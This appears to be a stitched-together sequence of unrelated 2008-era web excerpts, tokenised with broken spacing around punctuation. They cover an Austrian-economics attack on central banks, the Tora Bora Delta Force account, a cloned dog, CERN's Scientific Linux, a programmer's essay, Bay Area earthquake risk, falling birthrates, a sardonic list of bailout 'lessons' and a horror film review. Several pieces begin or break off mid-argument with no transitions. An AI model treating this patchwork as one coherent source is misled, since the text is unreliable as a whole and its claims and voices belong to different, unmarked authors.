Widespread discoordination in the economic system results : the financial bubble ( " irrational exuberance " ) exerts a harmful effect on the real economy , and sooner or later the process reverses in the form of an economic recession , which marks the beginning of the painful and necessary readjustment .
This readjustment invariably requires the reconversion of the entire real productive structure , which inflation has distorted .
The specific triggers of the end of the euphoric monetary " binge " and the beginning of the recessionary " hangover " are many , and they can vary from one cycle to another .
In the current circumstances , the most obvious triggers have been the rise in the price of raw materials , particularly oil , the subprime mortgage crisis in the United States , and finally , the failure of important banking institutions when it became clear in the market that the value of their debts exceeded that of their assets ( mortgage loans granted ) .
At present , numerous self - interested voices are demanding further reductions in interest rates and new injections of money , which permit those who desire it to complete their investment projects without suffering losses .
Nevertheless , this " flight into the future " would only temporarily postpone problems at the cost of making them far more serious later .
The crisis has hit because the profits of capital - goods companies ( especially in the building sector and in real - estate development ) have disappeared due to the entrepreneurial errors provoked by cheap credit , and because the prices of consumer goods have begun to rise faster than those of capital goods .
At this point , an inevitable , painful readjustment begins , and in addition to a drop in production and an increase in unemployment , we are now seeing a very harmful rise in the prices of consumer goods ( stagflation ) .
The most rigorous economic analysis and the coolest , most balanced interpretation of recent economic and financial events lead inexorably to the conclusion that central banks ( which are in fact monetary central - planning agencies ) cannot possibly succeed in finding the most advantageous monetary policy at every moment .
This is exactly what became clear in the case of the failed attempts to plan the former Soviet economy from above .
To put it another way , the theorem of the economic impossibility of socialism , which the Austrian economists Ludwig von Mises and Friedrich A . Hayek discovered , is fully applicable to central banks in general , and to the Federal Reserve and ( at one time ) Alan Greenspan and ( currently ) Ben Bernanke in particular .
According to this theorem , it is impossible to organize society , in terms of economics , based on coercive commands issued by a planning agency , since such a body can never obtain the information it needs to infuse its commands with a coordinating nature .
Indeed , nothing is more dangerous than to indulge in the " fatal conceit " — to use Hayek 's useful expression — of believing oneself omniscient or at least wise and powerful enough to be able to keep the most suitable monetary policy fine - tuned at all times .
Hence , rather than soften the most violent ups and downs of the economic cycle , the Federal Reserve and , to a lesser extent , the European Central Bank , have most likely been their main architects and the culprits in their worsening .
Therefore , the dilemma facing Ben Bernanke and his Federal Reserve Board , as well as the other central banks ( beginning with the European Central Bank ) , is not at all comfortable .
For years they have shirked their fiduciary responsibility , and now they find themselves in a blind alley .
They can either allow the recessionary process to begin now , and with it the healthy and painful readjustment , or they can procrastinate with a " hair of the dog " cure .
With the latter , the chances of even more severe stagflation in the not - too - distant future increase exponentially .
( This was precisely the error committed following the stock market crash of 1987 , an error that led to the inflation at the end of the 1980s and concluded with the sharp recession of 1990 - 1992 . )
Furthermore , the reintroduction of a cheap - credit policy at this stage could only hinder the necessary liquidation of unprofitable investments and company reconversion .
It could even wind up prolonging the recession indefinitely , as occurred in the Japanese economy , which , after all possible interventions were tried , ceased to respond to any stimulus involving credit expansion or Keynesian methods .
It is in this context of " financial schizophrenia " that we must interpret the latest " shots in the dark " fired by the monetary authorities ( who have two totally contradictory responsibilities : both to control inflation and to inject all the liquidity necessary into the financial system to prevent its collapse ) .
Thus , one day the Fed rescues AIG , Bear Stearns , Fannie Mae , and Freddie Mac , and the next it allows Lehman Brothers to fail , under the amply justified pretext of " teaching a lesson " and refusing to fuel moral hazard .
Finally , in light of the way events were unfolding , the US government announced a $ 700 billion plan to purchase illiquid ( i.e. , worthless ) assets from the banking system .
If the plan is financed by taxes ( and not more inflation ) , it will mean a heavy tax burden on households , precisely when they are least able to bear it .
In comparison , the economies of the European Union are in a somewhat less poor state ( if we do not consider the expansionary effect of the policy of deliberately depreciating the dollar , and the relatively greater European rigidities , particularly in the labor market , which tend to make recessions in Europe longer and more painful ) .
The expansionary policy of the European Central Bank , though not free of grave errors , has been somewhat less irresponsible than that of the Federal Reserve .
Furthermore , meeting the requirements for admission to the euro currency bloc ( convergence ) involved a healthful and significant rehabilitation of the chief European economies .
Only a few countries on the periphery , like Ireland and especially Spain , engaged in considerable credit expansion from the time they initiated their processes of convergence .
The case of Spain is paradigmatic .
The Spanish economy underwent an economic boom that was due , in part , to real causes ( liberalizing structural reforms which originated with José María Aznar 's administration ) .
Nevertheless , the boom was also largely fueled by an artificial expansion of money and credit , which grew at a rate nearly three times the corresponding rates in France and Germany .
Spanish economic agents essentially interpreted the decrease in interest rates which resulted from the convergence process in the easy - money terms traditional in Spain : a greater availability of easy money and mass requests for loans from Spanish banks ( mainly to finance real - estate speculation ) , loans which these banks have granted by creating the money ex nihilo while European central bankers looked on unperturbed .
When faced with the rise in prices , the European Central Bank has remained faithful to its mandate and has decided not to lower interest rates despite the difficulties of those members of the Monetary Union which , like Spain , are now discovering that much of their investment in real estate was in error and are heading for a lengthy and painful reorganization of their real economy .
Under these circumstances , the most appropriate policy would be to liberalize the economy at all levels ( especially in the labor market ) to permit the rapid reallocation of productive factors ( particularly labor ) to profitable sectors .
Likewise , it is essential to reduce public spending and taxes , in order to increase the available income of heavily indebted economic agents who need to repay their loans as soon as possible .
Economic agents in general and companies in particular can only rehabilitate their finances by cutting costs ( especially labor costs ) and paying off loans .
Essential to this aim are a very flexible labor market and a much more austere public sector .
These factors are fundamental if the market is to reveal as quickly as possible the real value of the investment goods produced in error and thus lay the foundation for a healthy , sustained economic recovery in a future that , for the good of all , we hope is not too distant .
Delta Force officer : US officials stopped plans to kill bin Laden David Edwards and Muriel Kane
Published : Monday October 6 , 2008
Print This Email This After September 11 , 2001 , a team of elite Delta Force commandos was sent into Afghanistan with an assignment to find and kill Osama bin Laden at Tora Bora -- but that mission failed .
The commander of the Delta Force team has now written a book which tells what he says is the true story of what went wrong .
He appeared anonymously on CBS 's 60 Minutes on Sunday to summarize that story .
Bin Laden was known to be holed up at Tora Bora on a ridge with an elevation of 14,000 feet .
The Delta Force team 's initial plan was to come at him from the direction he'd least expect , climbing over the mountains at his back , but that plan was n't approved by the higher - ups .
Their second idea , to drop hundreds of landmines along the mountain passes to Pakistan to impede bin Laden 's retreat and then bring in helicopters , was also turned down .
" How often does Delta come up with a tactical plan that 's disapproved by higher headquarters ? "
CBS 's Scott Pelley asked the commando leader .
" In my experience , in my five years at Delta , never before , " he replied .
The only remaining option was a frontal assault by 50 US Delta Force members plus their Afghan guides -- and the Afghan warlord accompanying the commandos frankly told them , " I do n't think you guys can handle it . "
A few million dollars from the CIA quickly secured his cooperation , but only to a degree .
The Delta Force leader told CBS that the Afghan fighters went home every night , abandoning whatever territory had been gained that day .
" It was almost like it was an agreement , an understanding between the two forces fighting each other , " he stated When the CIA did come up with an exact location on bin Laden , it was nighttime , and the Afghan support was nowhere to be found .
" It was n't worth the risk at that particular moment to go up there and play cowboy , " the leader told CBS .
" It was better to be cautious , refit , go up there with the entire force the next day and play the battle out as we had planned . "
But when he attempted to move on bin Laden the next day , his Afghan allies balked , saying they had negotiated a cease fire with al Qaeda , and even drew their weapons on the Delta force team to prevent it from acting alone .
Shortly thereafter , intercepted radio communications showed that bin Laden was on the move .
A cave which al Qaeda members had been seen entering was bombed for several hours , and it was thought that bin Laden had died there .
But when US forces checked the cave six months later , bin Laden 's body was not found .
The Delta Force leader believes he received medical treatment in a local village and then got away safely into Pakistan .
CBS News had more details here .

Snuppy , not to be confused with a similar sounding famous beagle who appears worldwide in a comic strip with his master , Charlie Brown , is the world ’s first cloned dog .
Shows to go you what I know or do n’t know as the case may be .
I did n’t know that was the dog ’s name , did you ?
I did know the first cloned sheep ’s name was Dolly .
Anyway … Snuppy has had pups .
Snuppy is an Afghan hound .
Snuppy is also the pop of 10 puppies through two dogs that were impregnated by artificial insemination .
I reckon when Snuppy was cloned the gene for doing ‘ it ’ was left out , eh ?
So , what do you call the child of an animal that was conceived by artificial means through a parent that was produced artificially ?
How about Arty ?
Snuppy ’s , um , creator ( a dude in Seoul – Hwang Woo- suk ) fell from grace when he falsified research saying he had also cloned human embryonic stem cells .
After his downfall , you could hear his colleagues saying , “ That sucks . ”
So , we have a creator who fell from grace for lying who made a dog who ’s sperm was used to artificially inseminate a couple of bitches … .
Does anybody else ’s head hurt besides mine ?
And do n’t we have enough dogs running around now , that we do n’t need to make more ?

The giant particle accelerator is looking , among other things , for the theoretical Higgs boson .
The process involves accelerating hydrogen atoms to the speed of light and then colliding them .
A particle detector then records the resulting paths .
Data to record this yearly is in the magnitude of 15 petabytes ( 15 million gigabytes ) .
The Scientific Linux jointly developed at CERN helps sort the information .
An LHC Computing Grid ( LCG ) consists of around 40,000 worldwide distributed CPUs that process the data .
The participating MACs and PCs will have loaded , among other software , the CERN - adapted Scientific Linux ( currently Scientific Linux CERN 4 ) .
The LCG wiki page includes instructions in how to set up the required systems and which applications grid participants need .
Contrary to what its name implies , Scientific Linux is not a collector of research software .
It is rather based on Red Hat Enterprise Linux .
CERN , Fermilab and other universities and research facilities contribute to the Linux distribution ’s development and adapt it to the needs of the worldwide research community .
A newer , more stable version 4.7 of the distribution appeared a week ago .
To take a peek at Scientific Linux , go to their project page .
You can download the distribution as an ISO image .

Enough ranting .
I want to talk about code that I liked , and what I learned from it .
The first really good stuff I encountered — after a number of years of reading Byte and Dr. Dobbs — was the late 70’s “ new wave ” clique of Kernighan , Ritchie and Plauger .
I inhaled K&R ’s _ The C Programming Language_ and soon after that , Kernighan and Plauger ’s _ Software Tools_ ( the hair - on - your - chest RATFOR version ) .
And , of course , John Lions ’ commentary on Unix , pilfered in classic Lions ’ Notes AT&T Trade Secret Violation Style at 8 pm on the office xerox machine .
I ’m convinced that early exposure to Pretty Good Stuff helped me out a lot in school .
Most of the courses I took in college were like “ Here ’s an algorithm , go implement it , ” without much exposure to exemplars of good style at all .
I had the feeling that TA ’s had to wade through ghastly piles of brick - like Pascal from other students , and that the TA ’s rather liked the style of the projects I turned in .
The next Good Stuff I read was at Atari , and it was some of the best 6502 assembly language code I ’ve ever seen .
What this code did was control the coin mechanism on many of Atari ’s arcade machines ( Tempest and Battlezone at least ) .
It handled a lot of security issues ( I forget what kind of jiggering it was capable of detecting , but it was rather a lot ) and many different variations of currency ( including foreign denominations ) and payment setup .
And it had to get things correct , or a pissed - off user might smash the machine and burn it .
I read most of the source to Donald Knuth ’s TeX .
I have a love - hate relationship with literate programming .
On the one hand I think it ’s a neat way to present a program .
But on the other , I ’m just not into writing literature ; most of the time I just need to bang out something that works pretty well and that wo n’t leave the next guy twisting in the breeze .
Raising edifices of deathless prose is a lot of bloody hard work .
We ca n’t all be Hemingway ; some of us have to write about the local dog shows .
I do n’t think I read anything at Apple that really captivated me ; maybe the Newton kernel , or the NewtonScript interpreter .
However , I did see another example of great low - level code ; a number of departments had huge feet - long bound listings of the Macintosh ROMs , which were very well commented 68000 and 68020 assembly .
Many lines of it had the initials of the engineers who had last touched them , and you could tell at a glance where the hot spots were .
( Updates to the 68 K - based Macintoshes were pretty horrendous , and we carried this tradition along to the Newton — basically , you ’d hook parts of the system and insert logic , by hook or by crook , that fixed problems or added features .
Where you could n’t directly patch something you could usually arrange to redirect a return address somewhere above you or something .
There were some world class clever programmers at Apple who could take someone else ’s attempt at a patch — say , fifty bytes — and boil it down to a gnarly twelve byte knot of distilled evil genius .
It ’s wonderful to have people like that guarding your back on a project ) .
There ’s a style of systems programming that I aspire to that might be described as “ just enough to carry the story ” — it ’s like that very spare 70 ’s Unix style , but with a little more plot .
As a young programmer I tended to put hooks and cute features into everything ; stuff had to be full of bells and whistles and show - off a lot or it was n’t fun to write .
These days I try to do just what ’s necessary in the most direct and clutter - free way than I can think of .
Usually this takes a couple of passes ; often it involves ripping junk out , and it always involves checking my ego at the door .
I am nowhere near the level of some masters of the art that I work with , and I hope to grow up to be like them some day .
Sometimes I ask people that I ’m interviewing , “ What ’s the most interesting code you ’ve read ? ”
It ’s saddening how many people do n’t even understand the question , like I ’m asking a ditch - digger which shovel is his favorite .
Occasionally , though , a light will come on in the other person ’s eyes , and they ’ll start talking about the really neat garbage collector they ran into a while ago , or the Mark XIV shovel with the tempered rivets , scalloped handle and semi-gloss finish .
And you know you have met someone who enjoys seeing quality software , studies it , and maybe knows how to write it , too .

Set the sky in motion !
Not seen in real - time by naked eye , but a time lapse technique speeds up the motion of the celestial objects .
About 7000 individual photographies were assembled showing the apparent motion of the sun , moon , and stars due to earths rotation .
Our daily life , the calendar , and our clock , is set by the cosmic motion .
Sunrise and sunset , the seasons , and also the motion of the moon ( tides ) have an important impact on our life .
This is the main reason why interest in astronomy occured in ancient times .
The day is set by the suns rise and set ( earths rotation ) , the month by the moons path around the earth , and the year and its seasons by the suns apparent path along the ecliptic ( earths motion around the sun ) .
This is our daily astronomy program since million of years and for more to come .
Steadiness and tranquility in contrast to our modern life .
The Federal Reserve and academics who give it advice are rethinking the proposition that the Fed cannot and should not try to prick financial bubbles .
" [ O ] bviously , the last decade has shown that bursting bubbles can be an extraordinarily dangerous and costly phenomenon for the economy , and there is no doubt that as we emerge from the financial crisis , we will all be looking at that issue and what can be done about it , " Fed Chairman Ben Bernanke said this week .
The bursting of this decade 's housing bubble , which was accompanied by a bubble of cheap credit , has wrought inestimable economic damage .
The U.S. economy was faltering before the crisis in credit markets recently intensified , rattling financial markets and sending home prices down further .
Even if the government 's decision to take stakes in major banks works , it could take weeks for money to flow freely again .
" A recession at least of the magnitude of 1982 is quite likely , " said ITG economist Robert Barbera .
The recession that ended in 1982 lasted 16 months -- twice as long as the 1991 and 2001 recessions -- and saw the unemployment rate rise to 10.8 % from 7.2 % .
While it is too soon to pronounce an about - face in Fed thinking , policy makers ' views clearly are evolving .
The Federal Reserve 's longtime line on financial bubbles has been that they were impossible to identify .
Even if the central bank could identify a bubble , policy makers said , trying to lance it would be far worse for the economy than letting the bubble run its course and dealing with the consequences .
Not exactly : he omits Mrs. Miniver , Gentleman ’s Agreement , and Crash — all Best Picture winners , all social or political bellwethers , and all movies he ( justifiably ) does n’t like .
He also ignores the Hope - Crosby “ Road ” movies , even though — as he notes in his typically penetrating and off - kilter history of Hollywood , The Whole Equation ( the title is from The Last Tycoon ) — those “ silly … stay - at - home ‘ Road ’ films ” exercised a profound “ healing effect ” on America , and their stars were “ the top box office attraction in America throughout the 1940s . ”
Oh — and he does include four entries on TV series ( The Singing Detective ; Tinker , Tailor , Soldier , Spy ; The Sopranos ; and Twenty Thousand Streets Under the Sky ) , products of a medium whose constraints and possibilities differ significantly from those of the cinema .
Thomson ca n’t resist forays into television : his entry on Johnny Carson is among the lengthiest and most perceptive in the Dictionary .
This jumble reveals a highly cultivated critical mind as it develops and refines judgments on minor issues , major themes , and first - order principles concerning the most vital art form of the 20th century and our social and emotional engagement with it .
Throughout , Thomson points out the films Oscar has honored and shunned — verdicts he deems “ misleading and unhelpful in the intelligent regard for movies in America ” — to support his contention that assessments of movie quality have been consistently “ ludicrous . ”
Embarrassingly stupid pronouncements are n’t limited to the movies , of course , but the cinema has been particularly susceptible to them .
The apparently obvious reason is that the sordid commercial standards for judging a huge industry ’s product have squashed the standards for judging creative endeavor .
But that ’s hardly adequate .
After all , stately , self - important , and socially worthy pictures , not mindless blockbusters , crowd the list of Oscar winners over the years .
And if many of the industry ’s judgments have been self - regarding and boneheaded , those of the academics and art - house critics have been faddish .
How many critics in 1973 would have assayed The Godfather superior to one of their then favorites , Bergman ’s ponderous The Seventh Seal ?
Still , Thomson insists that judgments be made , and that they be based on a deep comprehension of the medium .
This was n’t so uncommon when movies were truly a mass entertainment — when they were what Thomson calls “ the bloodstream of a great nation ” and something like half or three - quarters of the population went to the pictures each week ; even up through the early 1970s , a smaller audience had grown up in a movie - saturated culture .
( “ In the darkness at the movies , ” as Pauline Kael romanticized the situation , “ where nothing is asked of us and we are left alone , the liberation from duty and constraint allows us to develop our own aesthetic responses . ” )
WASHINGTON , Aug. 25 ( UPI ) -- A U.S. Homeland Security Department plan requiring three - day advance notice from foreign fliers would be bad for business , say airline leaders .
The registry plan would take effect in January and aim to give security officials more time to check for terrorism and immigration problems among an estimated 14 million visitors annually , USA Today reported Monday .

But airline and other business leaders say the measure would keep travelers away and hurt the U.S. image .
" The U.S. already has a bad reputation in terms of the difficulty of international travel , and this could make it even worse , " Steve Lott , of the International Air Transport Association , told USA Today .
" We foresee a lot of passengers getting to the airport having no idea what ( the new program ) is . "
Opponents want the Jan. 12 start date postponed .
Homeland Security officials have acknowledged there may be initial problems and have said they wo n't immediately stop unregistered travelers from entering the county .
" There 's certainly going to be a phase - in in terms of enforcement , " Kathy Kraninger , Homeland Security deputy assistant secretary for policy , said to USA Today .
Anti-robocall robocall
Process and substance have basically merged in this race , with the biggest black mark on McCain 's record apparently his political moves a few weeks ago .
And now Obama 's out with a robocall attacking McCain 's attack robocalls .
TPM has the Wisconsin version ( .wav ) :
" I live in Green Bay and , like you , I 've been getting sleazy phone calls and mail from John McCain and his supporters viciously -- and falsely -- attacking Barack Obama , " says the caller .
" I used to support John McCain because he honorably served our country -- but this year he 's running a dishonorable campaign .
We know McCain will continue many of Bush 's policies , and now he 's using George Bush 's divisive tactics .
In fact , he hired the Bush strategists whose attacks even McCain once called hateful . "
Restaraunt Uses Monkeys as Waiters
You expect to see something a little strange from time to time while traveling through Asia , but one establishment has something to really shock you .
Kayabuki , a Japanese tavern in Utsunomiya , recently employed 2 Macaques monkeys to act as waiters .
Fuku is 12 years - old and Yat is a young 4 years of age and both seem to enjoy their new work .
Kaoru Otsuka , owner of the tavern , says the 2 monkeys are their household pets , but one day he noticed one of them mimicking a waiter by giving the customer a hot towel in the restaurant .
Mr. Otsuka thought it would be an interesting idea to have them actually serve the customers .
Both monkeys works 2 hours a day , serving drinks and handing customer hot towels .
They do n’t seem to mind the work and are happy to do it in exchange for some Edamame ( soybeans ) from the customers as tip .
The monkey waiters have done such a good job and brought so much business to the restaurant , Mr. Otsuka admits they ’re better than his real son at the job .

Five Most Dangerous U.S. Earthquake Hotspots Beyond California
When the next big earthquake hits the San Francisco Bay Area , it will be a catastrophe of Hurricane Katrina proportions .
Hundreds , perhaps thousands of people will die , and hundreds of thousands will become homeless .
Economic losses will be on the order of $ 200 billion , the vast majority of it uninsured .
Outside help will be desperately needed , but difficult to coordinate and execute .
And just as before Hurricane Katrina , scientists have been sounding the alarm , warning that the disaster is inevitable .
It 's not a matter of if , but when the " Big One " will strike .
" The reality is that we could have a large earthquake at any time , " said geologist David Schwartz of the U.S. Geological Survey .
The Bay Area is lined with faults capable of delivering a knock - out blow .
But one in particular is poised to rupture sooner than later .
Geologists have determined that the average time between major earthquakes on the Hayward fault is 140 years .
The last big one was October 21 , 140 years ago .
The 1868 Hayward fault earthquake measured around a magnitude 7 and offset the ground laterally more than six feet in places .
It killed 30 people in the sparsely populated area and leveled or severely damaged nearly every structure in a wide swath along its 43 - mile length .
It was known as the Great San Francisco Earthquake until the 1906 earthquake took that title away .
But if the 1868 quake were to strike again today , it would do exponentially more damage .
The Hayward fault lies along the hills on the eastern side of the San Francisco Bay in one of the most densely populated areas of the state .
It runs beneath homes , schools , senior centers , hospitals , businesses and through the campus of UC Berkeley , bisecting the football stadium .
" A Hayward fault earthquake will change the Bay Area , " said USGS geologist Tom Brocher .
" It 's likely to be one of the nation 's biggest natural disasters . "
During the last 140 years , the population of the Bay Area has mushroomed to around seven million people .
As many as five million of them would be impacted by a major Hayward fault quake .
The Association of Bay Area Governments estimates that 220,000 people will be displaced from their homes , as many as 70,000 of those will seek public shelter .
But unlike in the areas affected by Katrina where more than half of the $ 125 billion in losses was insured , only around 8 percent of homes and businesses in the Bay Area are insured against earthquake damage , according to new research by Risk Management Solutions in Hayward .
" Our models suggest less than $ 10 billion will flow into the Bay
Area from insurance , " said seismologist Mary Lou Zoback of RMS .
" And the insurance money comes fairly quickly compared to money from federal and state programs . "
The region 's transportation infrastructure will take a major hit .
More than a thousand roads could be closed .
The Oakland and San Francisco International Airports , as well as the Port of Oakland , all lie on top of man-made fill , which is prone to liquefaction — where sediment acts like a liquid when shaken causing structures to founder .
Damage to the water delivery system may be the most worrisome because the Hetch Hetchy aqueduct , which supplies water for 2.4 million people , crosses the Hayward fault and could be ruptured in a major earthquake .
As in the 1906 earthquake , damaged gas lines could start fires , which will be difficult to fight without a working water supply .
And what water there is will need to be pumped to the firefighters using electricity that will likely be out in the immediate aftermath of the quake .
" All of these things cascade together , " Zoback said .
The $ 210 billion dollar damage that RMS estimates will result from a magnitude 7 Hayward fault quake does n't even take into account fire damage .
" I think our models way underestimate that impact . "
The Bay Area is prone to earthquakes because it straddles the boundary between two massive tectonic plates .
The Pacific plate is moving north relative to the North American plate at the rate of about 2 inches a year , but friction between the two plates keeps them from sliding smoothly past each other .
Over time , stress builds up , eventually overcoming the friction and releasing in an earthquake .
Much of the stress release happens on the San Andreas fault , the main seam between the plates , but some of it is relieved by the Hayward fault and other smaller parallel faults .
During the 1906 earthquake , 300 miles of the San Andreas ruptured and the two sides of the fault snapped past each other , moving as much as 20 feet in some places .
The energy released during that massive quake was the equivalent of 15 million tons of TNT .
Since then , with the accumulated stress of the plate motion relieved , the Bay Area has enjoyed a century of relative quiet , seismically speaking .
But all the while the plates have continued their inexorable march , slowly building up stress like a tightening spring .
And there are signs that the region may be emerging from this " stress shadow . "
The 1989 Loma Prieta earthquake could be one of those signs .
The magnitude 6.9 quake , the area 's largest since 1906 , struck the San Andreas in the Santa Cruz mountains .
That quake cast its own , smaller stress shadow , but models of the stress build up in the Bay Area due to plate motion suggest enough has accumulated to generate another major quake .
" The region is at a much higher stress level because the effects of the 1906 earthquake have worn off , " Schwartz said .
The U.S. Geological Survey estimates there is a 63 percent chance that a magnitude 6.7 or greater earthquake will hit one of the Bay Area faults in the next 30 years .
The Hayward fault , combined with its northern neighbor the Rogers Creek fault , accounts for 31 percent of that chance , more than any other fault including the San Andreas .
A major Hayward fault quake would severely cripple the Bay Area .
The epicenter of the Loma Prieta earthquake was more than 60 miles south of San Francisco and yet it killed 63 people , most of them on a highway that collapsed in Oakland , injured nearly 4,000 , did $ 6 billion in damage and knocked out a section of the Oakland Bay Bridge .
If the quake had struck at 5:04 p.m. on a normal weekday during rush hour , rather than on that unusual Tuesday afternoon when many had gone home early to watch the Bay Area 's two baseball teams slug it out in the third game of the World Series that had just started at San Francisco 's Candlestick Park , the death toll would have been significantly higher .
Move the epicenter of that quake , or a larger one , to the Hayward fault in the heart of the Bay Area , and it will make Loma Prieta look like a bad hair day .
So how do people in the Bay Area cope with this hazard ?
Though awareness of the potential for earthquakes is relatively high in the area , the USGS estimates only 10 percent of residents have a disaster plan and less than half have set aside supplies such as water , food and first aid .
A quick survey of the Wired.com office found that the staff is behind even that modest curve – just a third have done anything at all to prepare , and less than 10 percent have something resembling a comprehensive plan .
This may be because for some , it takes a certain amount of denial to live in earthquake country .
And many residents who lived through the 1989 quake , think they have already survived a major Bay Area earthquake .
They are wrong .
" They have the same expectations for the next one , " Brocher said .
" But a Hayward fault earthquake will be much closer to many of them , and it will be much more damaging . "

If this reading of southern European countries is correct  that their superficial commitment to modernity , to a 21st - century lifestyle , is fatally at odds with a view of the family structure that is rooted in the 19th century  it should apply in other parts of the world , should it not ?
Apparently it does .
This spring , the Japanese government released figures showing that the country ’s under - 14 population was the lowest since 1908 .
The head of Thailand ’s department of health announced in May that his country ’s birthrate now stands at 1.5 , far below the replacement level .
“ The world record for lowest - low fertility right now is South Korea , at 1.1 , ” Francesco Billari told me .
“ Japan is just about as low .
What we are seeing in Asia is a phenomenon of the 2000s , rather than the 1990s .
And it seems the reasons are the same as for southern Europe .
All of these are societies still rooted in the tradition where the husband earned all the money .
Things have changed , not only in Italy and Spain but also in Japan and Korea , but those societies have not yet adjusted .
The relationships within households have not adjusted yet . ”
Western Europe , then , is not the isolated case that some make it out to be .
It is simply the first region of the world to record extremely low birthrates .
Image Credit ... Edward del Rosario
WHICH BRINGS US TO A sparkling exception .
Last year the fertility rate in the United States hit 2.1 , the highest it has been since the 1960s and higher than almost anywhere in the developed world .
Factor in immigration and you have a nation that is far more than holding its own in terms of population .
In 1984 the U.S. Census Bureau projected that in the year 2050 the U.S. population would be 309 million .
In 2008 it ’s already 304 million , and the new projection for 2050 is 420 million .
“ Europeans say to me , How does the U.S. do it in this day and age ? ” says Carl Haub of the Population Reference Bureau in Washington .
According to Haub and others , there is no single explanation for the relatively high U.S. fertility rate .
The old conservative argument  that a traditional , working - husband - and - stay - at - home - wife family structure produces a healthy , growing population  does n’t apply , either in the U.S. or anywhere else in the world today .
Indeed , the societies most wedded to maintaining that traditional family structure seem to be those with the lowest birthrates .
The antidote , in Western Europe , has been the welfare - state model , in which the state provides comprehensive support to couples that want to have children .
But the U.S. runs counter to this .
Some commentators explain its healthy birthrate in terms of the relatively conservative and religiously oriented nature of American society , which both encourages larger families .
It ’s also true that mores have evolved in the U.S. to the point where not only is it socially acceptable for fathers to be active participants in raising children , but it ’s also often socially unacceptable for them to do otherwise .
But one other factor affecting the higher U.S. birthrate stands out in the minds of many observers .
“ There ’s much less flexibility in the European system , ” Haub says .
“ In Europe , both the society and the job market are more rigid . ”
There may be little state subsidy for child care in the U.S. , and there is certainly nothing like the warm governmental nest that Norway feathers for fledgling families , but the American system seems to make up for it in other ways .
As Hans - Peter Kohler of the University of Pennsylvania writes : “ In general , women are deterred from having children when the economic cost  in the form of lower lifetime wages  is too high .
Compared to other high - income countries , this cost is diminished by an American labor market that allows more flexible work hours and makes it easier to leave and then re-enter the labor force . ”
An American woman might choose to suspend her career for three or five years to raise a family , expecting to be able to resume working ; that happens far less easily in Europe .
So there would seem to be two models for achieving higher fertility : the neosocialist Scandinavian system and the laissez - faire American one .
Aassve put it to me this way : “ You might say that in order to promote fertility , your society needs to be generous or flexible .
The U.S. is n’t very generous , but it is flexible .
Italy is not generous in terms of social services and it ’s not flexible .
There is also a social stigma in countries like Italy , where it is seen as less socially accepted for women with children to work .
In the U.S. , that is very accepted . ”
By this logic , the worst sort of system is one that partly buys into the modern world  expanding educational and employment opportunities for women  but keeps its traditional mind - set .
This would seem to define the demographic crisis that Italy , Spain and Greece find themselves in  and , perhaps , Japan , South Korea , Hong Kong , Taiwan and other parts of the world .
Indeed , demographers have been surprised to find rapid fertility changes in the third world , as more and more women work and modern birth - control methods become standard options .
“ The earlier distinct fertility regimes , ‘ developed ’ and ‘ developing , ’ are increasingly disappearing in global comparisons of fertility levels , ” according to Edward Jow - Ching Tu , a sociologist at the Hong Kong University of Science and Technology .
According to the United Nations , the birthrate in 25 developing countries  including Cuba , Costa Rica , Iran , Sri Lanka and China  now stands at or below the replacement level .
In some cases  notably China  the drop is explained by a concentrated effort at containing the population .
In the rest , something else is happening .
The lesson of southern Europe is perhaps operative : embrace the modern only partway and you put your society  women in particular  in a vise .
Something has to give , and that turns out to be the future .
FOR $ 100 OR SO YOU CAN buy online a Third Reich “ Mother ’s Cross ” ( officially , a Cross of Honor of the German Mother ) .
The medals were struck , beginning in 1938 , in bronze for women who had four children , in silver for mothers of six and in gold for women who gave birth to eight .
They were given out annually on Hitler ’s mother ’s birthday to heroines of the cause of fertility , which the Führer referred to as “ the battlefield of women . ”
Natalism  the state - sponsored policy to increase the birthrate  has a rather tainted pedigree .
Nevertheless , in the age of “ lowest - low fertility , ” it has made a comeback .
If your population is falling , one logical , or seemingly logical , way to build it up again is to encourage people to have more babies .
As Lehman Brothers ( LEH ) turns into a single digit financial midget on its way to zero , as Washington Mutual ( WM ) works its way towards a buck , as Wachovia ( WB ) drops more than 80 % over a year , as Fannie Mae ( FNM ) and Freddie Mac ( FRE ) become divisions of the United States of America , and are now priced in pennies , as AIG continues to plummet -- we need to reflect upon the ongoing lessons learned from all these interventions by Treasury , Congress and the Federal Reserve .
The lesson from the Bear Stearns ' bailout -- $ 29 Billion in Federal Reserve bad paper guarantees -- are quite stark :
• Go Big :
Do n't just risk your company , risk the entire world of Finance .
Modest incompetence is insufficient -- if you merely destroy your own company , you wo n't get rescued .
You have to threaten to bring down the entire global financial system .
The fear and disruption caused by a Bear collapse is why it was saved .
( AIG has the right idea on this )
• If you cant Go Big , Go First : Had Lehman collapsed before Bear , then the same fear and loathing of the impact to the system might have worked to their advantage .
But having been through this once before , the sting is somewhat lessened -- especially for a smaller , lets interconnected firm like LEH ( in the dot com days , we called this " First mover advantage ! " ) .
• Threaten your counter - parties : Bear Stearns had about 9 trillion in its derivatives book , of which 40 % was held by JPMorgan ( JPM ) .
Some people have argued that the Bear bailout was actually a preventative rescue of JPMorgan .
Its a good strategy if your goal is a bailout -- risk bringing down someone much bigger than yourself .
• Risk an important part of the economy :
If your book of derivatives is limited to some obscure and irrelevant portion of the economy , you will not get saved .
On the other hand , AIG 's CDS might threaten much of the financial system .
Mortgages are important , credit cards and auto loans are too -- but securitized widget inventory is not .
To use a dirty word , Lehman 's exposure is " contained , " AIG 's was not .
• Balance Sheets Matter : Focus on the media , complain about short sellers , obsess about PR .
These are the hallmarks of a failing strategy -- and a grand waste of time .
Why ?
Its call insolvency .
ALL THAT MATTERS IS THE FIRMS ' BALANCE SHEET .
Lehman 's liabilities exceed its assets , and they are now toast .
Merrill Lynch got a lot of the junk off of its books , and got a takeover at 70 % premium to its closing price .
And Credit Suisse , who dumped much of its bad paper many quarters ago , is in a better tactical position than most of its peers .
In a new indie horror flick called Deadgirl , two high school guys find a naked zombie chick tied up in the basement of an abandoned insane asylum , so they invite their pals along to gang rape her .
Hailed by critics as one of the best horror movies of the year , Deadgirl generated tons of buzz at the Toronto Film Festival for its unflinching look at male bonding run amok .
Along with other recent indie horror fare like Zombie Strippers , Deadgirl turns zombies into figures for militant social outcasts — preyed - upon women who return to wreak vengeance .
Call it zombie feminism .
It 's a subgenre that goes back to the 1980s , and every time it dies , it just comes back stronger than ever .
Deadgirl is such a striking entry in the zombie feminism genre because it 's just so damn literal .
You 've got a naked girl , strapped to a bed in a mental institution , being raped by a bunch of teenaged guys .
Clearly a situation in need of a feminist zombie intervention if I ever saw one .
